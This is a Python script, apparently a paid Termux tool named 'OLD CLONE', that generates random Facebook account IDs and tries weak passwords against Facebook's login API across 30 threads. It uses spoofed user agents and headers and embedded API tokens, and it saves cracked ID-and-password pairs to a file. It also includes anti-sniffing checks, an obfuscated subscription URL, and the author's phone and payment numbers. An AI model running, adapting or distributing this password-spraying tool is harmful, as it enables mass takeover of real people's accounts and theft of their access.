import os,subprocess
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime


# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()


# Initial setup and promotion

# --- Anti-tampering and Security Checks ---
# The script checks if the source code of the 'requests' library has been modified
# or if packet sniffing tools are being used.
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass


class sec:
    """
    A security class to detect debugging and packet sniffing tools.
    """
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        # Paths to check for modifications
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        # Check for HTTPCanary (a packet sniffing app)
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        """
        Terminates the script if tampering is detected.
        """
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'

##-------------(Basic colors by YounisXyz)-------------------
yellow = "\033[1;33m"
black = "\033[1;90m"
red = "\033[1;91m"
green = "\033[1;32m"
blue = "\033[1;34m"
purple = "\033[1;35m"
cyan = "\033[1;36m"
r_cyan = "\033[38;5;122m"
r_purple = "\033[38;5;147m"
r_green = "\033[38;5;112m"
white = "\033[0;97m"
reset = '\x1b[0m'
pink = "\x1b[38;5;205m"
brown = "\x1b[38;5;208m"

def windows():
    """
    Generates a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])


def window1():
    """
    Generates another variant of a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])


# Set window title
sys.stdout.write('\x1b]2;𓆩【👑YOUNIS-XYZ👑 】𓆪 \x07')







os.system('xdg-open https://chat.whatsapp.com/KiMI15uX9KMGeht0hlzjwB?mode=gi_t')
    # FOZI BOSS Clover Logo - Green - Version 2.5
def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    
    print(f"""\033[1;37m
████████╗ ██████╗ ███████╗██╗
 ██╔════╝██╔═══██╗╚══███╔╝██║
 {black}█████╗  ██║   ██║  ███╔╝ ██║{reset}
 ██╔══╝  ██║   ██║ ███╔╝  ██║
 ██║     ╚██████╔╝███████╗██║
 ╚═╝      ╚═════╝ ╚══════╝╚═╝
 ██████╗  ██████╗ ███████╗███████╗
 ██╔══██╗██╔═══██╗██╔════╝██╔════╝
 {black}██████╔╝██║   ██║███████╗███████╗{reset}
 ██╔══██╗██║   ██║╚════██║╚════██║
 ██████╔╝╚██████╔╝███████║███████║
 ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
\t                \033[38;5;122mv. #1.0
{black}{20 * '⎯⎯'}
{black}|{reset}❯{black}|{white} AUTHOR     :   FOZI KHAN
{black}|{reset}❯{black}|{white} WHATSAPP   :   +923216950394 
{black}|{reset}❯{black}|{white} TOOL       :   {green}OLD CLONE
{black}{20 * '⎯⎯'}{white}
\033[0m""")

def linex():
    print(f'{black}⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯{white}')


import uuid,zlib,platform,subprocess
try:import httplib2
except ModuleNotFoundError:os.system('pip install httplib2')
class Subscription:
    def __init__(self):
        uuidd = str(os.geteuid()) + str(os.getlogin())
        __Younisid__ = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
        plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
        ____Younis____ = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
        ___YounisXyz___ = "~FOZI~"
        ___YounisXyzz___ = "~KING"
        self.key = ___YounisXyz___+__Younisid__+____Younis____+___YounisXyzz___
        try:
            self.http = httplib2.Http()
            self.url=str(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O\xcf,\xc9(M\xd2K\xce\xcf\xd5O\xcb\xaf\xcaL*J\xccK1\xb10\xd4\xcd(M\xd5w,(\xca/\xcf\xd1+\xa9(\xd1\x03*\x03\x00\xd47\x12Z')).replace("b'","").replace("'","")
            self.response = self.http.request(self.url, 'GET')
        except httplib2.error.ServerNotFoundError:exit(f'{red} Internet Connection Error!')
        linex()
        self.apv()

    def send(self):
        print(f"{white} Checking subscription.... ");time.sleep(2)
        ____banner____()
    def apv(self):
        
        try:
            ____banner____()
            self.send()
            if self.key in str(self.response):
                print(f"{green} Subscription successful ✓");time.sleep(1)
                pass
            else:
                ____banner____()
                print(f"{red} Your Key Not Approve! ")
                linex()
                print(f"{yellow} Key : {r_cyan}{self.key}")
                linex()
                print(f"\n Rs/- {green}700 {white}Pkr Monthly ({green}30 Days{white}) ")
                print(f"\n Rs/- {green}200 {white}Pkr Weekly ({green}7 Days{white}) ")
                print(f" {white}Easypaisa Number: {cyan}03425502755")
                print(f"{white} Name:{green} Muhammad Jameel\n")
                linex()
                print(f" After Pay Send Screenshot To Developer WhatsApp, If You're Free User Donot Come Inbox") 
                linex()
                input("\033[0;97m [ Press enter for send key to developer ] ")
                url_wa = "https://api.whatsapp.com/send?phone=+923216950394&text="
                name = input("\n Type Your Name : ")
                YounisXyz = ("*`Hi FOZI KHAN`* \n*~My Name is :~* _"+name+"_\n\n*I Want To Buy Your OLD CLONING Premium Tool Subscription*\n`My Key :` "+self.key)
                subprocess.check_output(["am", "start", url_wa+(YounisXyz)])
                print(f"\n{white} Your Request Successfully Send To Tool Owner Please Run Again The tool After You Get Subscription,\n{green} Thanku{white}") 
                exit()
        except Exception as e:exit(f'{red} Something Went Wrong in Script! {yellow}{e}')
        	




def creationyear(uid):
    """
    Estimates the Facebook account creation year based on the UID.
    """
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''





def FOZI_KING():
    ____banner____()
    print(f"{black}[{reset}1{black}]{reset} 2010 - 2014 Clone")
    print(f"{black}[{reset}2{black}]{reset} 2012 - 2013 Clone")
    print(f"{black}[{reset}0{black}]{reset} Contact Developer")
    linex()
    _input = input(f"{white} Select :{green} ")
    if _input in ('01', '1'):
        Subscription();old_One()
    elif _input in ('02', '2'):
        Subscription();old_Tow()
    elif _input in ('00', '0'):
        os.system('xdg-open https://api.whatsapp.com/send?phone=+923216950394');FOZI_KING()
    else:
        print(f"\n{red} Choose Value Option... ")
        FOZI_KING()


def old_One():
    user = []
    ____banner____()
    ask='1'
    print(f"{black}[{reset}-{black}]{reset} FOR EXAMPLE :{reset} 10000 {black}|{reset} 20000 {black}|{reset} 50000 {black}|{reset} 100000")
    linex()
    limit = input(f"{black}[{red}?{black}]{reset} LIMIT : ")
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    ____banner____()
    print(f"{black}[{reset}1{black}]{reset} METHOD {green}1")
    print(f"{black}[{reset}2{black}]{reset} METHOD {green}2")
    linex()
    meth = input(f"{black}[{red}?{black}]{reset} SELECT LOGIN METHOD : ").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"{black}[{reset}-{black}]{reset} TOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"{black}[{reset}-{black}]{reset} TRUN {green}ON{black}/{red}OFF{reset} AIRPLANE MODE IF NO RESULTS")
        linex()
        for mal in user:
            uid = star + mal
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                print(f"    {red}[!] INVALID METHOD SELECTED")
                break


def old_Tow():
    user = []
    ____banner____()
    print(f"{black}[{reset}-{black}]{reset} FOR EXAMPLE :{reset} 10000 {black}|{reset} 20000 {black}|{reset} 50000 {black}|{reset} 100000")
    linex()
    limit = input(f"{black}[{red}?{black}]{reset} LIMIT : ")
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    ____banner____()
    print(f"{black}[{reset}1{black}]{reset} METHOD {green}1")
    print(f"{black}[{reset}2{black}]{reset} METHOD {green}2")
    linex()
    meth = input(f"{black}[{red}?{black}]{reset} SELECT LOGIN METHOD : ").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"{black}[{reset}-{black}]{reset} TOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"{black}[{reset}-{black}]{reset} TRUN {green}ON{black}/{red}OFF{reset} AIRPLANE MODE IF NO RESULTS")
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                print(f"    {red}[!] INVALID METHOD SELECTED")
                break




def login_1(uid):
    """
    Login attempt method 1.
    """
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r{black}[{reset}FOZI BOSS-M1👑{black}] {yellow}{loop}{black} | {green}ok{reset}:{black}[{green}{len(oks)}{black}]{white} ")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789', '1234567890'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r{black}[{green}FOZI-OK💚{black}] {green}{uid} {reset}= {green}{pw} {reset}= {cyan}{creationyear(uid)}")
                open('/sdcard/FOZI-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r{black}[{green}FOZI-OK💸{black}] {uid} {reset}= {green}{pw} {reset}= {cyan}{creationyear(uid)}")
                open('/sdcard/FOZI-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)


def login_2(uid):
    """
    Login attempt method 2.
    """
    global loop
    session = requests.session()
    sys.stdout.write(f"\r{black}[{reset}FOZI BOSS-M2👑{black}] {yellow}{loop}{black} | {green}ok{reset}:{black}[{green}{len(oks)}{black}]{white} ");sys.stdout.flush()
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r{black}[{green}FOZI-OK💚{black}] {green}{uid} {reset}= {green}{pw} {reset}= {cyan}{creationyear(uid)}")
                    open('/sdcard/FOZI-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r{black}[{green}FOZI-OK💸{black}] {uid} {reset}= {green}{pw} {reset}= {cyan}{creationyear(uid)}")
                    open('/sdcard/FOZI-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception as e:
            pass
    loop += 1

FOZI_KING()
